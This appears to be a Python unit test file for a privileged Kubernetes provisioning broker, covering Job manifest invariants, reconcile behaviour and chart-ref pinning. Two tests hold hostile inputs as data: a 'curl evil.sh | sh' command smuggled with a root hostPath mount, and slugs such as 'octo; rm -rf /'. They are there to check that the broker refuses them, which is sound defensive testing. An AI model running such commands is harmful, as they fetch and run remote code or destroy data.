#!/usr/bin/env python3
"""Unit tests for broker.py — the privileged provisioning broker (#421).

Pure-Python: kubectl is faked by monkeypatching the two plumbing helpers, so
these run with no cluster and no network.

Most of the Job-manifest assertions here are MOVED, near-verbatim, from
controller_test.py. That move is the point of #421: the code that stamps the
privileged Job no longer lives in the internet-facing process. The invariants it
must satisfy did not change, so neither did the tests — only which module they
point at.

Run from charts/workspace-controller:
    python3 -m unittest discover -s tests -p '*_test.py' -v
"""
import io
import json
import os
import sys
import unittest

# broker.py lives one dir up; import it without installing anything.
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import broker  # noqa: E402

# tests/ -> workspace-controller/ -> charts/ -> repo root.
REPO_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(
    os.path.dirname(os.path.abspath(__file__)))))
PROVISION_SH = os.path.join(REPO_ROOT, 'provisioner', 'provision.sh')


def _read(path):
    with open(path, encoding='utf-8') as fh:
        return fh.read()


class _BrokerConfigMixin:
    """Pin the broker-side constants a Job is stamped from."""

    def pin_config(self, **overrides):
        defaults = {
            'PROVISIONER_IMAGE': 'example/provisioner@sha256:abc',
            'PROVISIONER_SA': 'workspace-provisioner',
            'PROVISIONER_PULL_SECRET': '',
            'BROKER_NAMESPACE': 'kube-coder-provision',
            'CONTROL_PLANE_NAMESPACE': 'coder',
            'WORKSPACE_PREFIX': 'ws-',
            'CHART_REPO': 'https://github.com/imran31415/kube-coder.git',
            'CHART_REF': 'v1.40.1',
            'ALLOW_MUTABLE_CHART_REF': False,
            'GITOPS_REPO': 'github.com/x/y.git',
            'GITOPS_BRANCH': 'main',
            'GITOPS_TOKEN': 'tok',
        }
        defaults.update(overrides)
        for name, value in defaults.items():
            self.addCleanup(setattr, broker, name, getattr(broker, name))
            setattr(broker, name, value)


class JobTemplateTest(_BrokerConfigMixin, unittest.TestCase):
    """The immutable template. Moved from controller_test.py's
    test_job_manifest_* — same assertions, new owner."""

    def setUp(self):
        self.pin_config()

    def test_job_uses_provisioner_sa_and_slug(self):
        job = broker.build_job_manifest('octo')
        self.assertEqual(job['kind'], 'Job')
        self.assertEqual(job['spec']['template']['spec']['serviceAccountName'],
                         'workspace-provisioner')
        self.assertEqual(job['metadata']['labels']['provisionUser'], 'octo')
        env = {e['name']: e.get('value')
               for e in job['spec']['template']['spec']['containers'][0]['env']}
        self.assertEqual(env['SLUG'], 'octo')
        # Three distinct namespaces since #421: the Job runs in the BROKER's,
        # copies regcred FROM the control plane's, and deploys INTO ws-<slug>.
        self.assertEqual(job['metadata']['namespace'], 'kube-coder-provision')
        self.assertEqual(env['NAMESPACE'], 'coder')
        self.assertEqual(env['WS_NAMESPACE'], 'ws-octo')
        self.assertIn('ttlSecondsAfterFinished', job['spec'])
        self.assertEqual(job['spec']['template']['spec']['restartPolicy'], 'Never')

    def test_job_runs_in_the_broker_namespace_not_the_controllers(self):
        """The single most important assertion in this file. A Job in the
        control-plane namespace would put the privileged SA back beside the
        internet-facing controller, which is the bridge #421 removed."""
        job = broker.build_job_manifest('octo')
        self.assertEqual(job['metadata']['namespace'], broker.BROKER_NAMESPACE)
        self.assertNotEqual(job['metadata']['namespace'], broker.CONTROL_PLANE_NAMESPACE)

    def test_job_conforms_to_admission_policy_invariants(self):
        """The ValidatingAdmissionPolicy (templates/provisioner-vap.yaml) pins
        the shape of any Job running as the provisioner SA. The broker's own Job
        must satisfy every rule or deploying the policy would reject it."""
        self.pin_config(PROVISIONER_IMAGE='test-registry/coder@sha256:abc')
        pod = broker.build_job_manifest('octo')['spec']['template']['spec']
        self.assertEqual(len(pod['containers']), 1)
        self.assertEqual(pod['containers'][0]['name'], 'provision')
        self.assertNotIn('initContainers', pod)
        self.assertNotIn('ephemeralContainers', pod)
        # No command/args override — the image's baked entrypoint is the program
        # (#422); the VAP denies these outright.
        self.assertNotIn('command', pod['containers'][0])
        self.assertNotIn('args', pod['containers'][0])
        self.assertTrue(pod['containers'][0]['image'].startswith('test-registry/coder'))
        for c in pod['containers']:
            sc = c.get('securityContext', {})
            self.assertFalse(sc.get('privileged'))
            self.assertFalse(sc.get('allowPrivilegeEscalation'))
            self.assertNotEqual(sc.get('runAsUser'), 0)
            self.assertFalse(sc.get('capabilities', {}).get('add'))
        self.assertFalse(pod.get('hostNetwork'))
        self.assertFalse(pod.get('hostPID'))
        self.assertFalse(pod.get('hostIPC'))
        for v in pod.get('volumes', []):
            self.assertNotIn('hostPath', v)

    def test_job_still_passes_the_full_env_contract(self):
        """Env is the Job's whole input surface, so it must stay complete — the
        script fails closed on any empty one."""
        container = broker.build_job_manifest('octo')['spec']['template']['spec']['containers'][0]
        names = {e['name'] for e in container['env']}
        required = {'SLUG', 'NAMESPACE', 'WS_NAMESPACE', 'CHART_REPO', 'CHART_REF',
                    'GITOPS_REPO', 'GITOPS_BRANCH', 'GITOPS_TOKEN'}
        self.assertEqual(required, names & required)
        script = _read(PROVISION_SH)
        for var in required:
            self.assertIn(var, script)

    def test_fails_closed_without_a_provisioner_image(self):
        self.pin_config(PROVISIONER_IMAGE='')
        with self.assertRaises(broker.ProvisionError) as ctx:
            broker.build_job_manifest('octo')
        self.assertIn('provision.image', str(ctx.exception))

    def test_job_name_is_the_request_name_so_stamping_is_idempotent(self):
        job = broker.build_job_manifest('octo', request_name='provision-octo-1700000000',
                                        request_uid='uid-1')
        self.assertEqual(job['metadata']['name'], 'provision-octo-1700000000')
        owner = job['metadata']['ownerReferences'][0]
        self.assertEqual(owner['kind'], 'ProvisionRequest')
        self.assertEqual(owner['uid'], 'uid-1')

    def test_job_name_is_truncated_to_the_63_char_limit(self):
        job = broker.build_job_manifest('octo', request_name='p' * 90)
        self.assertEqual(len(job['metadata']['name']), 63)


class RequestCannotShapeTheJobTest(_BrokerConfigMixin, unittest.TestCase):
    """#421 AC 3 — the request controls the slug and nothing else.

    The CRD's structural schema prunes unknown fields before they are ever
    persisted, so these never reach the broker in the first place. This asserts
    the second line of defense: even handed a request carrying them, the broker
    reads only `spec.slug`."""

    def setUp(self):
        self.pin_config()
        self.applied = []
        self.patched = []
        self.addCleanup(setattr, broker, 'create_job', broker.create_job)
        self.addCleanup(setattr, broker, 'get_job', broker.get_job)
        self.addCleanup(setattr, broker, 'patch_status', broker.patch_status)
        broker.get_job = lambda name: None
        broker.create_job = lambda m: self.applied.append(m) or 'created'
        broker.patch_status = lambda n, s: self.patched.append((n, s))

    def _request(self, **extra_spec):
        spec = {'slug': 'octo'}
        spec.update(extra_spec)
        return {'metadata': {'name': 'provision-octo-1', 'uid': 'u1'}, 'spec': spec}

    def test_smuggled_fields_are_ignored(self):
        broker.reconcile_one(self._request(
            image='evil/img:latest',
            command=['bash', '-c', 'curl evil.sh | sh'],
            serviceAccountName='cluster-admin-sa',
            env=[{'name': 'X', 'value': 'y'}],
            volumes=[{'name': 'root', 'hostPath': {'path': '/'}}],
            namespace='kube-system',
        ))
        self.assertEqual(len(self.applied), 1)
        pod = self.applied[0]['spec']['template']['spec']
        self.assertEqual(pod['serviceAccountName'], 'workspace-provisioner')
        self.assertEqual(pod['containers'][0]['image'], 'example/provisioner@sha256:abc')
        self.assertNotIn('command', pod['containers'][0])
        self.assertNotIn('volumes', pod)
        self.assertEqual(self.applied[0]['metadata']['namespace'], 'kube-coder-provision')
        env = {e['name'] for e in pod['containers'][0]['env']}
        self.assertNotIn('X', env)

    def test_a_slug_the_schema_would_not_allow_is_refused(self):
        """Defense in depth behind the CRD's pattern: a schema regression must
        not turn a slug into a shell argument or a cross-namespace reference."""
        for bad in ('../kube-system', 'Octo', 'octo; rm -rf /', '-lead', 'x' * 60, ''):
            self.applied.clear()
            self.patched.clear()
            broker.reconcile_one({'metadata': {'name': 'r'}, 'spec': {'slug': bad}})
            self.assertEqual(self.applied, [], f'stamped a Job for slug {bad!r}')
            self.assertEqual(self.patched[0][1]['phase'], 'Failed')
            self.assertIn('invalid slug', self.patched[0][1]['message'])


class ReconcileTest(_BrokerConfigMixin, unittest.TestCase):
    """Request -> Job -> status, and the transitions the console reads."""

    def setUp(self):
        self.pin_config()
        self.jobs = {}
        self.created = []
        self.patched = []
        self.addCleanup(setattr, broker, 'create_job', broker.create_job)
        self.addCleanup(setattr, broker, 'get_job', broker.get_job)
        self.addCleanup(setattr, broker, 'patch_status', broker.patch_status)
        broker.get_job = lambda name: self.jobs.get(name)
        broker.create_job = lambda m: self.created.append(m) or 'created'
        broker.patch_status = lambda n, s: self.patched.append((n, s))

    def _req(self, status=None):
        return {'metadata': {'name': 'provision-octo-1', 'uid': 'u1'},
                'spec': {'slug': 'octo'}, 'status': status or {}}

    def test_new_request_stamps_a_job_and_records_it(self):
        broker.reconcile_one(self._req())
        self.assertEqual(len(self.created), 1)
        name, patch = self.patched[-1]
        # Pending, not Running — the Job has no status yet, which is exactly
        # what provision_status reported for a freshly created Job pre-#421.
        self.assertEqual(patch['phase'], 'Pending')
        self.assertEqual(patch['jobName'], 'provision-octo-1')

    def test_a_crash_between_stamping_and_recording_adopts_the_existing_job(self):
        """The broker created the Job but died before writing jobName. The next
        pass must ADOPT it, not stamp a second privileged helm upgrade."""
        self.jobs['provision-octo-1'] = {'status': {'active': 1}}
        broker.reconcile_one(self._req())            # status has no jobName
        self.assertEqual(self.created, [])
        _, patch = self.patched[-1]
        self.assertEqual(patch['jobName'], 'provision-octo-1')
        self.assertEqual(patch['phase'], 'Running')

    def test_a_vanished_job_is_reported_not_restamped(self):
        """A Job recorded on the request but no longer present — reaped by its
        1h TTL while the broker was down — has an unknowable outcome. Stamping a
        replacement would re-run a privileged helm upgrade nobody asked for."""
        broker.reconcile_one(self._req({'phase': 'Running', 'jobName': 'provision-octo-1'}))
        self.assertEqual(self.created, [])
        _, patch = self.patched[-1]
        self.assertEqual(patch['phase'], 'Failed')
        self.assertIn('no longer exists', patch['message'])

    def test_running_job_is_not_stamped_twice(self):
        self.jobs['provision-octo-1'] = {'status': {'active': 1}}
        broker.reconcile_one(self._req({'phase': 'Running', 'jobName': 'provision-octo-1'}))
        self.assertEqual(self.created, [])
        self.assertEqual(self.patched, [])       # no change -> no write

    def test_succeeded_job_becomes_a_terminal_phase(self):
        self.jobs['provision-octo-1'] = {'status': {'succeeded': 1}}
        broker.reconcile_one(self._req({'phase': 'Running', 'jobName': 'provision-octo-1'}))
        _, patch = self.patched[-1]
        self.assertEqual(patch['phase'], 'Succeeded')
        self.assertIn('finishedAt', patch)

    def test_failed_job_carries_a_message(self):
        self.jobs['provision-octo-1'] = {'status': {'failed': 1}}
        broker.reconcile_one(self._req({'phase': 'Running', 'jobName': 'provision-octo-1'}))
        _, patch = self.patched[-1]
        self.assertEqual(patch['phase'], 'Failed')
        self.assertIn('Job failed', patch['message'])

    def test_terminal_requests_are_left_alone(self):
        for phase in ('Succeeded', 'Failed'):
            self.created.clear()
            self.patched.clear()
            broker.reconcile_one(self._req({'phase': phase, 'jobName': 'provision-octo-1'}))
            self.assertEqual(self.created, [])
            self.assertEqual(self.patched, [])

    def test_misconfiguration_surfaces_on_the_request(self):
        """An unset provision.image used to 400 at the controller's HTTP layer.
        The controller cannot see it any more, so the broker must report it
        somewhere the console can read — the request's status."""
        self.pin_config(PROVISIONER_IMAGE='')
        broker.reconcile_one(self._req())
        self.assertEqual(self.created, [])
        _, patch = self.patched[-1]
        self.assertEqual(patch['phase'], 'Failed')
        self.assertIn('provision.image', patch['message'])

    def test_a_refused_create_is_recorded_not_retried_forever(self):
        """Admission rejecting the Job shape, or a missing RBAC verb, is
        deterministic. Retrying it every poll would be an invisible loop."""
        def refuse(manifest):
            raise broker.KubectlError('kubectl create failed',
                                      'admission webhook denied the request: image must be pinned by digest')
        broker.create_job = refuse
        broker.reconcile_one(self._req())
        _, patch = self.patched[-1]
        self.assertEqual(patch['phase'], 'Failed')
        self.assertIn('pinned by digest', patch['message'])

    def test_one_bad_request_does_not_stall_the_others(self):
        """A single malformed or unreadable request must not block every other
        tenant's provisioning — the loop swallows per-request failures."""
        def explode_for_the_first_only(name):
            if name == 'provision-octo-1':
                raise RuntimeError('boom')
            return None
        broker.get_job = explode_for_the_first_only
        good = {'metadata': {'name': 'ok', 'uid': 'u2'},
                'spec': {'slug': 'other'}, 'status': {}}
        self.addCleanup(setattr, broker, 'list_requests', broker.list_requests)
        self.addCleanup(setattr, broker, 'collect_garbage', broker.collect_garbage)
        broker.list_requests = lambda: [self._req(), good]
        broker.collect_garbage = lambda reqs: None
        self.assertEqual(broker.reconcile_once(), 2)     # neither raised out
        # The healthy request was still driven forward.
        self.assertEqual([m['metadata']['name'] for m in self.created], ['ok'])
        self.assertEqual(self.patched[-1][0], 'ok')


class ChartRefSupplyChainTest(_BrokerConfigMixin, unittest.TestCase):
    """Finding 7, moved with its owner: the Job clones CHART_REF and runs its
    make deploy under the cluster-privileged provisioner SA, so the ref must be
    immutable. The broker holds the ref now — the controller cannot supply one."""

    def setUp(self):
        self.pin_config()

    def test_classify_chart_ref(self):
        self.assertEqual(broker.classify_chart_ref('a' * 40), 'commit-sha')
        self.assertEqual(broker.classify_chart_ref('b' * 64), 'commit-sha')
        self.assertEqual(broker.classify_chart_ref('v1.40.1'), 'release-tag')
        for mut in ('main', 'latest', 'HEAD', 'feature/x', 'develop', 'abc1234'):
            self.assertEqual(broker.classify_chart_ref(mut), 'mutable', mut)

    def test_rejects_mutable_refs_by_default(self):
        for mut in ('main', 'latest', 'HEAD', 'feature/x'):
            self.pin_config(CHART_REF=mut)
            with self.assertRaises(broker.ProvisionError):
                broker.validate_chart_ref(mut)
            with self.assertRaises(broker.ProvisionError):
                broker.build_job_manifest('octo')

    def test_error_message_names_the_escape_hatch(self):
        with self.assertRaises(broker.ProvisionError) as ctx:
            broker.validate_chart_ref('main')
        msg = str(ctx.exception)
        self.assertIn('allowMutableRef', msg)
        self.assertIn('immutable', msg)

    def test_accepts_immutable_sha_and_release_tag(self):
        for ref in ('a' * 40, 'c' * 64, 'v1.40.1'):
            self.pin_config(CHART_REF=ref)
            job = broker.build_job_manifest('octo')      # must not raise
            env = {e['name']: e.get('value')
                   for e in job['spec']['template']['spec']['containers'][0]['env']}
            self.assertEqual(env['CHART_REF'], ref)

    def test_escape_hatch_permits_mutable_ref(self):
        self.pin_config(ALLOW_MUTABLE_CHART_REF=True, CHART_REF='main')
        self.assertEqual(broker.validate_chart_ref('main'), 'mutable')
        job = broker.build_job_manifest('octo')          # must not raise
        env = {e['name']: e.get('value')
               for e in job['spec']['template']['spec']['containers'][0]['env']}
        self.assertEqual(env['CHART_REF'], 'main')

    def _stderr_of(self, fn):
        buf, orig = io.StringIO(), sys.stderr
        sys.stderr = buf
        try:
            fn()
        finally:
            sys.stderr = orig
        return buf.getvalue()

    def test_resolved_ref_is_logged(self):
        self.pin_config(CHART_REF='v1.40.1')
        out = self._stderr_of(lambda: broker.build_job_manifest('octo'))
        self.assertIn('v1.40.1', out)
        self.assertIn('release-tag', out)
        self.assertIn('octo', out)

    def test_escape_hatch_decision_is_logged(self):
        self.pin_config(ALLOW_MUTABLE_CHART_REF=True, CHART_REF='main')
        out = self._stderr_of(lambda: broker.build_job_manifest('octo'))
        self.assertIn('allowMutableRef=True', out)
        self.assertIn('(mutable)', out)


class GarbageCollectionTest(unittest.TestCase):
    """Finished requests are retired so the namespace does not accumulate a
    record (and, via ownerReferences, a Job) per provision forever."""

    def setUp(self):
        self.deleted = []
        self.addCleanup(setattr, broker, '_kubectl_run', broker._kubectl_run)
        broker._kubectl_run = lambda args, stdin=None: self.deleted.append(args) or ''

    def _req(self, name, phase, finished):
        return {'metadata': {'name': name},
                'status': {'phase': phase, 'finishedAt': finished}}

    def test_retires_only_old_terminal_requests(self):
        old = '2020-01-01T00:00:00Z'
        new = '2999-01-01T00:00:00Z'
        broker.collect_garbage([
            self._req('old-ok', 'Succeeded', old),
            self._req('old-bad', 'Failed', old),
            self._req('fresh', 'Succeeded', new),
            self._req('running', 'Running', None),
        ])
        retired = {a[2] for a in self.deleted}
        self.assertEqual(retired, {'old-ok', 'old-bad'})

    def test_unparseable_timestamp_is_not_treated_as_ancient(self):
        broker.collect_garbage([self._req('weird', 'Succeeded', 'not-a-date')])
        self.assertEqual(self.deleted, [])


class KubectlPlumbingTest(unittest.TestCase):
    def test_status_writes_target_the_status_subresource(self):
        """RBAC splits `provisionrequests` from `provisionrequests/status`: the
        controller may create a request but not write its outcome. That only
        holds if the broker actually writes through the subresource."""
        calls = []
        self.addCleanup(setattr, broker, '_kubectl_run', broker._kubectl_run)
        broker._kubectl_run = lambda args, stdin=None: calls.append(args) or ''
        broker.patch_status('r1', {'phase': 'Running'})
        self.assertIn('--subresource=status', calls[0])
        self.assertIn(broker.CRD_RESOURCE, calls[0])
        payload = json.loads(calls[0][calls[0].index('-p') + 1])
        self.assertEqual(payload, {'status': {'phase': 'Running'}})

    def test_already_exists_on_create_is_not_an_error(self):
        """Idempotent stamping: a broker that crashed after creating the Job but
        before recording it must not start a second privileged helm upgrade."""
        def boom(args, stdin=None):
            raise broker.KubectlError('kubectl create failed',
                                      'Error from server (AlreadyExists): jobs.batch "x" already exists')
        self.addCleanup(setattr, broker, '_kubectl_run', broker._kubectl_run)
        broker._kubectl_run = boom
        self.assertEqual(broker.create_job({'kind': 'Job'}), 'unchanged')

    def test_only_a_real_notfound_means_the_job_is_absent(self):
        """A transient API error or a missing RBAC verb must NOT read as
        "no Job exists" — reconcile_one would answer that by stamping another
        privileged Job, every poll, forever."""
        def absent(args, _attempts=2):
            raise broker.KubectlError('kubectl get failed',
                                      'Error from server (NotFound): jobs.batch "x" not found')

        def broken(args, _attempts=2):
            raise broker.KubectlError('kubectl get failed',
                                      'Error from server (Forbidden): cannot list jobs')
        self.addCleanup(setattr, broker, '_kubectl_json', broker._kubectl_json)
        broker._kubectl_json = absent
        self.assertIsNone(broker.get_job('x'))
        broker._kubectl_json = broken
        with self.assertRaises(broker.KubectlError):
            broker.get_job('x')

    def test_other_create_errors_still_raise(self):
        def boom(args, stdin=None):
            raise broker.KubectlError('kubectl create failed', 'Error: forbidden')
        self.addCleanup(setattr, broker, '_kubectl_run', broker._kubectl_run)
        broker._kubectl_run = boom
        with self.assertRaises(broker.KubectlError):
            broker.create_job({'kind': 'Job'})


if __name__ == '__main__':
    unittest.main()
